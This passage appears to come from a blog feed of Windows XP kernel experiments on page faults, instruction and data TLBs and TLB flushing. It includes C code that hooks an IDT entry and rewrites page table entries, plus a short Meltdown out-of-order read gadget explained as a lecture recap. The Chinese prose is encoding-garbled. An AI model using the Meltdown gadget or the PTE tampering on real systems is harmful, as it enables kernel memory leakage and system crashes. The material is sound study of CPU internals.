class="line">ReadVirtual: 80541450 not properly sign extended</span><br><span class="line">80541450 6830f10380      push    8003F130h</span><br><span class="line">80541455 c3              ret</span><br><span class="line">80541456 005553          add     byte ptr [ebp+53h],dl</span><br><span class="line">80541459 56              push    esi</span><br><span class="line">8054145a 57              push    edi</span><br><span class="line">8054145b 0fa0            push    fs</span><br><span class="line">8054145d bb30000000      mov     ebx,30h</span><br><span class="line">80541462 668ee3          mov     fs,bx</span><br><span class="line"><span class="meta prompt_">kd&gt; </span><span class="language-bash">u 8003F130 l20</span></span><br><span class="line">ReadVirtual: 8003f130 not properly sign extended</span><br><span class="line">8003f130 50              push    eax</span><br><span class="line">8003f131 0f20d8          mov     eax,cr3</span><br><span class="line">8003f134 3e3b0558f20380  cmp     eax,dword ptr ds:[8003F258h]</span><br><span class="line">8003f13b 751f            jne     8003f15c</span><br><span class="line">8003f13d 368b442404      mov     eax,dword ptr ss:[esp+4]</span><br><span class="line">8003f142 3ea350f20380    mov     dword ptr ds:[8003F250h],eax</span><br><span class="line">8003f148 368b442408      mov     eax,dword ptr ss:[esp+8]</span><br><span class="line">8003f14d 3ea354f20380    mov     dword ptr ds:[8003F254h],eax</span><br><span class="line">8003f153 0f20d0          mov     eax,cr2</span><br><span class="line">8003f156 3ea35cf20380    mov     dword ptr ds:[8003F25Ch],eax</span><br><span class="line">8003f15c 58              pop     eax</span><br><span class="line">8003f15d 66c74424020000  mov     word ptr [esp+2],0</span><br><span class="line">8003f164 6857145480      push    offset nt!KiTrap0E+0x7 (80541457)</span><br></pre></td></tr></table></figure><p><img src="/2023/06/03/Windows-Kernel-Experiment-Page-Fault/image-20230603224451243.png" alt="image-20230603224451243"></p>]]></content>
      
      
      
        <tags>
            
            <tag> Windows Kernel Experiment </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Windowså†…æ ¸å®éªŒ:æŒ‡ä»¤TLB(ITLB)å’Œæµæ°´çº¿&amp;&amp;Meltdown CPUæ¼æ´</title>
      <link href="/2023/06/03/Windows-Kernel-Experiment-ITLB-Pipeline/"/>
      <url>/2023/06/03/Windows-Kernel-Experiment-ITLB-Pipeline/</url>
      
        <content type="html"><![CDATA[<h1 id="Windowså†…æ ¸å®éªŒ-æŒ‡ä»¤TLB-ITLB-å’Œæµæ°´çº¿-amp-amp-Meltdown-CPUæ¼æ´"><a href="#Windowså†…æ ¸å®éªŒ-æŒ‡ä»¤TLB-ITLB-å’Œæµæ°´çº¿-amp-amp-Meltdown-CPUæ¼æ´" class="headerlink" title="Windowså†…æ ¸å®éªŒ:æŒ‡ä»¤TLB(ITLB)å’Œæµæ°´çº¿&amp;&amp;Meltdown CPUæ¼æ´"></a>Windowså†…æ ¸å®éªŒ:æŒ‡ä»¤TLB(ITLB)å’Œæµæ°´çº¿&amp;&amp;Meltdown CPUæ¼æ´</h1><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PDE(x) (DWORD64 *) (((x &gt;&gt; 21) &lt;&lt; 3) + 0xc0600000)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PTE(x) (DWORD64 *) (((x &gt;&gt; 12) &lt;&lt; 3) + 0xc0000000)</span></span><br><span class="line">DWORD g_var;<span class="comment">//0041A1D0</span></span><br><span class="line">DWORD64 g_pte;<span class="comment">//0x0041A1C8</span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> section(<span class="string">&quot;new_page&quot;</span>,read,write)</span></span><br><span class="line">__declspec(allocate(<span class="string">&quot;new_page&quot;</span>)) DWORD page1[<span class="number">1024</span>];<span class="comment">//0x0041b000</span></span><br><span class="line">__declspec(allocate(<span class="string">&quot;new_page&quot;</span>)) DWORD page2[<span class="number">1024</span>];<span class="comment">//0x0041c000</span></span><br><span class="line"><span class="type">void</span> __declspec(naked) IdtEntry() &#123;<span class="comment">//è£¸å‡½æ•°ä¸ä¼šå¸®æˆ‘ä»¬ç”Ÿæˆæ ˆå¸§ï¼Œå•çº¯ä¸€ä¸ªcall</span></span><br><span class="line">    <span class="comment">//__asm int 3</span></span><br><span class="line">    g_pte = *PTE(<span class="number">0x0041c000</span>);</span><br><span class="line">    __asm mov eax, ds: [<span class="number">0x0041c000</span>]<span class="comment">//å†æ¬¡ç¡®ä¿page2çš„é¡µé¢åœ¨tlbé‡Œï¼Œæ²¡æœ‰è¢«æ¢å‡º</span></span><br><span class="line">    __asm &#123;</span><br><span class="line">        mov eax,cr3</span><br><span class="line">        mov cr3,eax</span><br><span class="line">    &#125;<span class="comment">//æ¸…é™¤tlb</span></span><br><span class="line">    *PTE(<span class="number">0x0041c000</span>) = *PTE(<span class="number">0x0041b000</span>);<span class="comment">//tlb misss</span></span><br><span class="line">    <span class="comment">//g_var = page2[0];</span></span><br><span class="line">    _asm &#123;</span><br><span class="line">        mov eax,ds:[<span class="number">0x0041c000</span>]</span><br><span class="line">        mov g_var,eax</span><br><span class="line">    &#125;</span><br><span class="line">    *PTE(<span class="number">0x0041c000</span>) = g_pte;</span><br><span class="line">    __asm &#123;</span><br><span class="line">        mov eax, cr3</span><br><span class="line">        mov cr3, eax</span><br><span class="line">    &#125;<span class="comment">//æ¸…é™¤tlb</span></span><br><span class="line">    __asm &#123;</span><br><span class="line">        iretd</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">interrupt</span><span class="params">()</span> &#123;</span><br><span class="line">    page1[<span class="number">0</span>] = <span class="number">0xc3</span>;<span class="comment">//ret</span></span><br><span class="line">    page2[<span class="number">0</span>] = <span class="number">0xc390</span>;<span class="comment">//nop ret è½½ç‰©ç†å†…å­˜çš„åŒæ—¶æŠŠè™šæ‹Ÿå†…å­˜æ”¾åˆ°tlbé‡Œ</span></span><br><span class="line">    ((<span class="type">void</span>(*)(<span class="type">void</span>))page1)();</span><br><span class="line">    ((<span class="type">void</span>(*)(<span class="type">void</span>))page2)();</span><br><span class="line">    __asm &#123;</span><br><span class="line">        <span class="type">int</span> <span class="number">0x20</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="number">0x401040</span> != IdtEntry) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Idtentry address wrong&quot;</span>);</span><br><span class="line">        system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//eq 8003f500  0040ee00`00081040</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>;i++) &#123;</span><br><span class="line">        interrupt();</span><br><span class="line">        <span class="keyword">if</span> (<span class="number">0xc3</span> != g_var)</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;g_var:%x\n&quot;</span>, g_var);</span><br><span class="line">    &#125;</span><br><span class="line">    system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªç¨‹åºåœ¨æˆ‘æœºå™¨ä¸Šæˆ‘æ„Ÿè§‰æ˜¯ç”±äºnew_pageå’ŒIdtEntryä¹‹é—´çš„è·ç¦»å¤ªå¤§äº†ï¼Œå¯¼è‡´æ²¡æœ‰å¤ç°æˆåŠŸ</p><p>ç®€å•è¯´ä¸€ä¸‹ä¸»è¦æ€è·¯æŠŠ</p><p>ä¸ºäº†ä½¿è·å¾—çš„section pageæœ‰å¯æ‰§è¡Œæƒé™ï¼ŒæŠŠpage1å’Œpage2å…ˆå½“ä½œå‡½æ•°æ‰§è¡Œäº†ä¸€ä¸‹ï¼Œå°±å¯ä»¥è·å¾—å¯æ‰§è¡Œæƒé™</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">kd&gt; !pte <span class="number">0x0041b000</span></span><br><span class="line">                    VA <span class="number">0041b</span>000</span><br><span class="line">PDE at C0600010            PTE at C00020D8</span><br><span class="line">contains <span class="number">000000000295</span>C067  contains <span class="number">0000000002903067</span></span><br><span class="line">pfn <span class="number">295</span>c      ---DA--UWEV  pfn <span class="number">2903</span>      ---DA--UWEV</span><br><span class="line"></span><br><span class="line">kd&gt; !pte <span class="number">0x0041c000</span></span><br><span class="line">                    VA <span class="number">0041</span>c000</span><br><span class="line">PDE at C0600010            PTE at C00020E0</span><br><span class="line">contains <span class="number">000000000295</span>C067  contains <span class="number">000000000</span>A024067</span><br><span class="line">pfn <span class="number">295</span>c      ---DA--UWEV  pfn a024      ---DA--UWEV</span><br></pre></td></tr></table></figure><blockquote><p>ä¸ºä»€ä¹ˆæ²¡æœ‰ç”¨#pragma section(â€œnew_pageâ€,read,writeï¼Œexecute)è·å–å¯æ‰§è¡Œæƒé™</p><p>è¿™ä¸ªæ˜¯å¯ä»¥ç¼–è¯‘é€šè¿‡ï¼Œä½†ä¼¼ä¹xpç³»ç»Ÿä¸å…è®¸ä¸€ä¸ªé¡µå¯è¯»å¯å†™å¯æ‰§è¡Œï¼Œå´©æºƒäº†</p></blockquote><p>page1 2æœ‰äº†å¯æ‰§è¡Œæƒé™ï¼Œç”±äºæµæ°´çº¿æŠ€æœ¯ï¼ŒæŒ‡ä»¤å¯èƒ½ä¼šå¹¶è¡Œï¼ŒIdtEntryæ‰§è¡Œæ—¶ï¼Œå¦‚æœå–æŒ‡ä»¤å¯ä»¥ä¸€æ¬¡åˆ°è¾¾page1 2ï¼Œä¼šå¯¹è¯¥æŒ‡ä»¤å…ˆæ‰§è¡Œï¼Œå°±ä¼šå¯¼è‡´page1 2è¢«æå‰è®¿é—®ï¼Œæ”¾å…¥tlb</p><h2 id="Meltdown-CPUæ¼æ´"><a href="#Meltdown-CPUæ¼æ´" class="headerlink" title="Meltdown CPUæ¼æ´"></a>Meltdown CPUæ¼æ´</h2><p>çªç„¶æƒ³èµ·ä¹‹å‰åœ¨jyyè€å¸ˆé‚£é‡Œå¬åˆ°çš„cpuç†”æ–­æ¼æ´ï¼Œå¯ä»¥åœ¨ç”¨æˆ·æ€å¾€å†…æ ¸æˆ–å…¶ä»–è¿›ç¨‹é‡Œå·å‡ºæ•°æ®</p><p>æ¼æ´çš„åŸå› å’Œ<strong>ä¹±åºæ‰§è¡Œ</strong>æœ‰å…³ï¼Œå±äºcpuæ¶æ„çš„æ¼æ´</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// %rcx: æ— æƒé™è®¿é—®çš„åœ°å€ï¼›%rbx: æœªè½½å…¥ç¼“å­˜çš„æ•°ç»„</span></span><br><span class="line">        xorq   %rax, %rax</span><br><span class="line">retry:  movzbq (%rcx), %rax   <span class="comment">// éæ³•è®¿é—®ï¼›Page Fault</span></span><br><span class="line">        shlq   $<span class="number">0xc</span>, %rax</span><br><span class="line">        jz     retry</span><br><span class="line">        <span class="title function_">movq</span>   <span class="params">(%rbx, %rax)</span>, %rbx <span class="comment">// (%rbx + (%rax) * 4096)</span></span><br></pre></td></tr></table></figure><ol><li>cpuåœ¨æ‰§è¡Œmovzbq (%rcx), %raxæŒ‡ä»¤çš„æ—¶å€™ï¼Œä¼šé€ æˆé¡µé”™è¯¯ï¼Œä½†æ˜¯æ˜¯å…ˆæŠŠæ•°æ®å–å‡ºæ¥äº†ï¼Œç„¶ååšæ•°æ®åˆæ³•æ€§æ£€æŸ¥ï¼Œä¸åˆæ³•ä¼šå¤„ç†é”™è¯¯ï¼Œ</li><li>ç”±äºè¿™æ®µä»£ç æ˜¯ç¬¦åˆä¹±åºå¹¶è¡Œçš„ï¼Œä¸‹é¢çš„æŒ‡ä»¤ä¼šåœ¨raxæœ‰æ•°æ®çš„ä¸€ç¬é—´å’Œ1.æ­¥éª¤é‡Œæ£€æŸ¥åˆæ³•æ€§ä¸€èµ·æ‰§è¡Œ</li><li>ä¸‹é¢çš„æŒ‡ä»¤å¤§æ¦‚ç‡æ˜¯æ¯”æ£€æŸ¥åˆæ³•æ€§çš„ä»£ç è¦å¿«çš„</li><li>movq   (%rbx, %rax), %rbx å°±ä¼šä½¿åœ¨æœªè½½å…¥ç¼“å­˜çš„æ•°ç»„ä¸­ä½ç½®æ˜¯rcxåœ°å€å¤„çš„1byteæ•°æ®çš„é¡µè¿›å…¥cacheï¼Œ</li><li>åç»­è®¿é—®rbxå„é¡µé¢ï¼Œæ¯”è¾ƒè®¿é—®æ—¶é—´å°±å¯ä»¥è·å–è¿™ä¸ªå­—èŠ‚çš„æ•°æ® (cache hitå’Œcache missè®¿é—®æ—¶é—´å·®è·å¯è§)</li></ol><p>æ¼æ´çš„åŸå› å°±æ˜¯è®¿é—®ä¸åˆæ³•åï¼Œæ²¡æœ‰å°†æ±¡æŸ“çš„cacheæ¸…é™¤</p>]]></content>
      
      
      
        <tags>
            
            <tag> Windows Kernel Experiment </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Windowså†…æ ¸å®éªŒ:æ•°æ®TLB(DTLB)</title>
      <link href="/2023/06/03/Windows-Kernel-Experiment-DTLB/"/>
      <url>/2023/06/03/Windows-Kernel-Experiment-DTLB/</url>
      
        <content type="html"><![CDATA[<h1 id="Windowså†…æ ¸å®éªŒ-æ•°æ®TLB-DTLB"><a href="#Windowså†…æ ¸å®éªŒ-æ•°æ®TLB-DTLB" class="headerlink" title="Windowså†…æ ¸å®éªŒ:æ•°æ®TLB(DTLB)"></a>Windowså†…æ ¸å®éªŒ:æ•°æ®TLB(DTLB)</h1><p>TLBï¼ˆTranslation Lookaside Bufferï¼‰æ˜¯ä»è™šæ‹Ÿåœ°å€åˆ°ç‰©ç†åœ°å€è½¬æ¢çš„ç¼“å­˜(ä¸€çº§ä¸€çº§æŸ¥é¡µè¡¨å¤ªè€—è´¹æ—¶é—´äº†)ï¼ŒTLBå‘½ä¸­åå°±ä¸ä¼šå†å»è®¿é—®ç‰©ç†å†…å­˜å»æŸ¥æ‰¾ï¼Œå¯¹äºtlbæ˜¯å¯¹æˆ‘ä»¬å®Œå…¨é€æ˜çš„(ä¸€æ ¸ä¸€å¥—TLB)ï¼Œæ²¡æœ‰ä¸€æ¡æŒ‡ä»¤å»çœ‹tlbçš„å†…å®¹ï¼Œè°ƒè¯•å™¨ä¹Ÿä¸è¡Œ</p><p>æ‰€ä»¥å®éªŒæ—¶ä¸€å®šè¦ä¿è¯æ‰§è¡Œçš„æŒ‡ä»¤æ˜¯åœ¨ä¸€ä¸ªé¡µä¸Šï¼Œå³ä¸é€ æˆé¡µé¢å¼‚å¸¸ï¼Œä¸ç„¶é¡µé¢å¼‚å¸¸ä¼šè¾ƒå¤§çš„å½±å“tlbé‡Œçš„å†…å®¹ï¼Œå¯¹å®éªŒç°è±¡é€ æˆä¸å¯è§£é‡Šçš„ç»“æœ</p><h2 id="å®éªŒç°è±¡"><a href="#å®éªŒç°è±¡" class="headerlink" title="å®éªŒç°è±¡"></a>å®éªŒç°è±¡</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PDE(x) (DWORD64 *) (((x &gt;&gt; 21) &lt;&lt; 3) + 0xc0600000)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PTE(x) (DWORD64 *) (((x &gt;&gt; 12) &lt;&lt; 3) + 0xc0000000)</span></span><br><span class="line">DWORD g_var;</span><br><span class="line">DWORD64 g_pte;</span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> section(<span class="string">&quot;new_page&quot;</span>,read,write)</span></span><br><span class="line">__declspec(allocate(<span class="string">&quot;new_page&quot;</span>)) DWORD page1[<span class="number">1024</span>];<span class="comment">//0x0041b000</span></span><br><span class="line">__declspec(allocate(<span class="string">&quot;new_page&quot;</span>)) DWORD page2[<span class="number">1024</span>];<span class="comment">//0x0041c000</span></span><br><span class="line"><span class="type">void</span> __declspec(naked) IdtEntry() &#123;<span class="comment">//è£¸å‡½æ•°ä¸ä¼šå¸®æˆ‘ä»¬ç”Ÿæˆæ ˆå¸§ï¼Œå•çº¯ä¸€ä¸ªcall</span></span><br><span class="line">    __asm &#123;</span><br><span class="line">        mov eax,ds:[<span class="number">0x0041c000</span>]<span class="comment">//å†æ¬¡ç¡®ä¿page2çš„é¡µé¢åœ¨tlbé‡Œï¼Œæ²¡æœ‰è¢«æ¢å‡º</span></span><br><span class="line">    &#125;</span><br><span class="line">    g_pte= *PTE(<span class="number">0x0041c000</span>);</span><br><span class="line">    *PTE(<span class="number">0x0041c000</span>) = *PTE(<span class="number">0x0041b000</span>);</span><br><span class="line">    g_var = page2[<span class="number">0</span>];</span><br><span class="line">    *PTE(<span class="number">0x0041c000</span>) = g_pte;<span class="comment">//æ¢å›åŸæ¥çš„é¡µè¡¨é¡¹ï¼Œé¿å…double free é€ æˆçš„è“å±</span></span><br><span class="line">    __asm&#123;</span><br><span class="line">        iretd</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">interrupt</span><span class="params">()</span> &#123;</span><br><span class="line">    page1[<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line">    page2[<span class="number">0</span>] = <span class="number">2</span>;<span class="comment">//æŒ‚è½½ç‰©ç†å†…å­˜çš„åŒæ—¶æŠŠè™šæ‹Ÿå†…å­˜æ”¾åˆ°tlbé‡Œ</span></span><br><span class="line">    __asm &#123;</span><br><span class="line">        <span class="type">int</span> <span class="number">0x20</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="number">0x401040</span> != IdtEntry) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Idtentry address wrong&quot;</span>);</span><br><span class="line">        system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//eq 8003f500  0040ee00`00081040</span></span><br><span class="line">    interrupt();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;g_var:%d\n&quot;</span>,g_var);</span><br><span class="line">    system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">g_var:<span class="number">2</span></span><br><span class="line">è¯·æŒ‰ä»»æ„é”®ç»§ç»­. . .</span><br></pre></td></tr></table></figure><p>å¦‚æœæ²¡æœ‰tlbï¼Œæˆ‘ä»¬æŠŠpage2çš„é¡µè¡¨é¡¹å˜ä¸ºpage1çš„é¡µè¡¨é¡¹ï¼Œg_var &#x3D; page2[0];å°±æ˜¯æŠŠpage1çš„æ•°æ®æ”¾å…¥g_var,æ‰“å°å‡º1</p><p>ä½†æ˜¯æœ‰äº†tlbï¼Œæ­¤æ—¶è™½ç„¶é¡µè¡¨æ¢äº†ä½†æ˜¯tlbæ²¡æœ‰åˆ·æ–°ï¼Œåœ¨è®¿é—®page2è™šæ‹Ÿå†…å­˜æ—¶ç›´æ¥åœ¨tlbä¸­å‘½ä¸­äº†åŸæ¥çš„ç‰©ç†åœ°å€ï¼Œæ‰€ä»¥ä¾æ—§æ‰“å°å‡ºäº†2</p><p>åœ¨è¿›ç¨‹ç»“æŸæ—¶ï¼Œæ“ä½œç³»ç»Ÿä¼šå›æ”¶è™šæ‹Ÿå†…å­˜æ˜ å°„çš„ç‰©ç†å†…å­˜ï¼Œè¿™ä¸ªæ—¶å€™å¦‚æœä¸æŠŠpage2çš„é¡µè¡¨é¡¹æ¢å›æ¥ï¼Œå°±ä¼šé€ æˆpage1çš„double freeï¼Œä»è€Œè“å±</p><h2 id="åˆ·æ–°tlb"><a href="#åˆ·æ–°tlb" class="headerlink" title="åˆ·æ–°tlb"></a>åˆ·æ–°tlb</h2><p>TLBçš„åˆ·æ–°(<strong>ä½¿tlbæ— æ•ˆï¼Œæ„Ÿè§‰åƒæ¸…é™¤</strong>)é€šå¸¸å‘ç”Ÿåœ¨ä»¥ä¸‹æƒ…å†µä¸‹ï¼š</p><ol><li>ä¸Šä¸‹æ–‡åˆ‡æ¢ï¼šå½“æ“ä½œç³»ç»Ÿåˆ‡æ¢è¿›ç¨‹æ—¶ï¼ŒTLBå¯èƒ½ä¼šè¢«åˆ·æ–°ï¼Œä»¥ç¡®ä¿æ–°è¿›ç¨‹çš„è™šæ‹Ÿåœ°å€èƒ½å¤Ÿæ­£ç¡®åœ°æ˜ å°„åˆ°ç‰©ç†åœ°å€ã€‚</li><li>å†…å­˜ç®¡ç†å•å…ƒï¼ˆMMUï¼‰å¤±æ•ˆï¼šå¦‚æœæ“ä½œç³»ç»Ÿæ›´æ”¹äº†é¡µè¡¨æˆ–åœ°å€æ˜ å°„æ–¹æ¡ˆï¼Œå®ƒå¯èƒ½ä¼šé€šçŸ¥å¤„ç†å™¨åˆ·æ–°TLBï¼Œä»¥ä¾¿æ›´æ–°åœ°å€æ˜ å°„ã€‚</li><li>å¼ºåˆ¶åˆ·æ–°ï¼šåœ¨æŸäº›ç‰¹å®šçš„æƒ…å†µä¸‹ï¼Œæ“ä½œç³»ç»Ÿæˆ–å¤„ç†å™¨å¯èƒ½éœ€è¦å¼ºåˆ¶åˆ·æ–°TLBï¼Œä»¥ç¡®ä¿ä¸€è‡´æ€§å’Œæ­£ç¡®æ€§ã€‚invlpg addræŒ‡ä»¤(Invalidate Page)å¯ä»¥æ— è§†g(global)æ ‡å¿—ä½å°†è¯¥è™šæ‹Ÿåœ°å€çš„TLBé¡¹æ ‡è®°ä¸ºæ— æ•ˆï¼Œä¸‹æ¬¡ä¼šè®¿é—®ä¼šæ›´æ–°tlb</li></ol><p>æ‰€ä»¥æˆ‘ä»¬æŠŠcr3é‡æ–°è£…å…¥å°±ä¼šåˆ·æ–°TLB</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PDE(x) (DWORD64 *) (((x &gt;&gt; 21) &lt;&lt; 3) + 0xc0600000)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PTE(x) (DWORD64 *) (((x &gt;&gt; 12) &lt;&lt; 3) + 0xc0000000)</span></span><br><span class="line">DWORD g_var;</span><br><span class="line">DWORD64 g_pte;</span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> section(<span class="string">&quot;new_page&quot;</span>,read,write)</span></span><br><span class="line">__declspec(allocate(<span class="string">&quot;new_page&quot;</span>)) DWORD page1[<span class="number">1024</span>];<span class="comment">//0x0041b000</span></span><br><span class="line">__declspec(allocate(<span class="string">&quot;new_page&quot;</span>)) DWORD page2[<span class="number">1024</span>];<span class="comment">//0x0041c000</span></span><br><span class="line"><span class="type">void</span> __declspec(naked) IdtEntry() &#123;<span class="comment">//è£¸å‡½æ•°ä¸ä¼šå¸®æˆ‘ä»¬ç”Ÿæˆæ ˆå¸§ï¼Œå•çº¯ä¸€ä¸ªcall</span></span><br><span class="line">    __asm &#123;</span><br><span class="line">        mov eax, ds: [<span class="number">0x0041c000</span>]<span class="comment">//å†æ¬¡ç¡®ä¿page2çš„é¡µé¢åœ¨tlbé‡Œï¼Œæ²¡æœ‰è¢«æ¢å‡º</span></span><br><span class="line">    &#125;</span><br><span class="line">    g_pte = *PTE(<span class="number">0x0041c000</span>);</span><br><span class="line">    *PTE(<span class="number">0x0041c000</span>) = *PTE(<span class="number">0x0041b000</span>);</span><br><span class="line">    __asm &#123;</span><br><span class="line">        mov eax,cr3</span><br><span class="line">        mov cr3,eax<span class="comment">//åˆ·æ–°TLB</span></span><br><span class="line">    &#125;</span><br><span class="line">    g_var = page2[<span class="number">0</span>];</span><br><span class="line">    *PTE(<span class="number">0x0041c000</span>) = g_pte;<span class="comment">//æ¢å›åŸæ¥çš„é¡µè¡¨é¡¹ï¼Œé¿å…double free é€ æˆçš„è“å±</span></span><br><span class="line">    __asm &#123;</span><br><span class="line">        iretd</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">interrupt</span><span class="params">()</span> &#123;</span><br><span class="line">    page1[<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line">    page2[<span class="number">0</span>] = <span class="number">2</span>;<span class="comment">//æŒ‚è½½ç‰©ç†å†…å­˜çš„åŒæ—¶æŠŠè™šæ‹Ÿå†…å­˜æ”¾åˆ°tlbé‡Œ</span></span><br><span class="line">    __asm &#123;</span><br><span class="line">        <span class="type">int</span> <span class="number">0x20</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="number">0x401040</span> != IdtEntry) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Idtentry address wrong&quot;</span>);</span><br><span class="line">        system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//eq 8003f500  0040ee00`00081040</span></span><br><span class="line">    interrupt();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;g_var:%d\n&quot;</span>, g_var);</span><br><span class="line">    system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">g_var:<span class="number">1</span></span><br><span class="line">è¯·æŒ‰ä»»æ„é”®ç»§ç»­. . .</span><br></pre></td></tr></table></figure><h2 id="Gä½ï¼Œè¿›ä¸€æ­¥æå‡æ€§èƒ½"><a href="#Gä½ï¼Œè¿›ä¸€æ­¥æå‡æ€§èƒ½" class="headerlink" title="Gä½ï¼Œè¿›ä¸€æ­¥æå‡æ€§èƒ½"></a>Gä½ï¼Œè¿›ä¸€æ­¥æå‡æ€§èƒ½</h2><p>é¡µç›®å½•é¡¹å’Œé¡µè¡¨é¡¹çš„ç¬¬8ä½æ˜¯G(gloabal)ä½</p><p><img src="/2023/06/03/Windows-Kernel-Experiment-DTLB/image-20230603122904700.png" alt="image-20230603122904700"></p><p>åœ¨tlbé‡Œä¼šè®°å½•è¿™ä¸ªGä½ï¼Œå¦‚æœæ˜¯å…¨å±€é¡µï¼Œåœ¨åˆ·æ–°tlb(é™¤äº†å¼ºåˆ¶(invlpg)æ—¶ï¼Œä¸ä¼šåˆ·æ–°å¸¦æœ‰Gä½çš„tlbé¡¹</p><p>è¿™æ ·åšæ˜¯å› ä¸ºå†…æ ¸ä¸­çš„å¤šæ•°æ•°æ®æ˜¯è¿›ç¨‹å…±äº«çš„ï¼Œæ¯æ¬¡åˆ‡æ¢è¿›ç¨‹æ—¶åˆ·æ–°è¿™äº›æ²¡å¿…è¦åˆ·æ–°çš„å†…å­˜æµªè´¹æ€§èƒ½</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">kd&gt; </span><span class="language-bash">!process 0 0 test.exe</span></span><br><span class="line">Failed to get VadRoot</span><br><span class="line">PROCESS 8137ada0  SessionId: 0  Cid: 0430    Peb: 7ffdb000  ParentCid: 04f0</span><br><span class="line">    DirBase: 090c0360  ObjectTable: e24d1a98  HandleCount:  15.</span><br><span class="line">    Image: test.exe</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">kd&gt; </span><span class="language-bash">.process /i 8137ada0</span></span><br><span class="line">You need to continue execution (press &#x27;g&#x27; &lt;enter&gt;) for the context</span><br><span class="line">to be switched. When the debugger breaks in again, you will be in</span><br><span class="line">the new process context.</span><br><span class="line"><span class="meta prompt_">kd&gt; </span><span class="language-bash">g</span></span><br><span class="line">Break instruction exception - code 80000003 (first chance)</span><br><span class="line">nt!RtlpBreakWithStatusInstruction:</span><br><span class="line">80528bdc cc              int     3</span><br><span class="line"><span class="meta prompt_">kd&gt; </span><span class="language-bash">!pte 0x0041b000</span></span><br><span class="line">                    VA 0041b000</span><br><span class="line">PDE at C0600010            PTE at C00020D8</span><br><span class="line">contains 000000000FE30067  contains 8000000000938067</span><br><span class="line">pfn fe30      ---DA--UWEV  pfn 938       ---DA--UW-V</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">kd&gt; </span><span class="language-bash">!pte gdtr</span></span><br><span class="line">                    VA 8003f000</span><br><span class="line">PDE at C0602000            PTE at C04001F8</span><br><span class="line">contains 0000000000B0A163  contains 000000000003F163</span><br><span class="line">pfn b0a       -G-DA--KWEV  pfn 3f        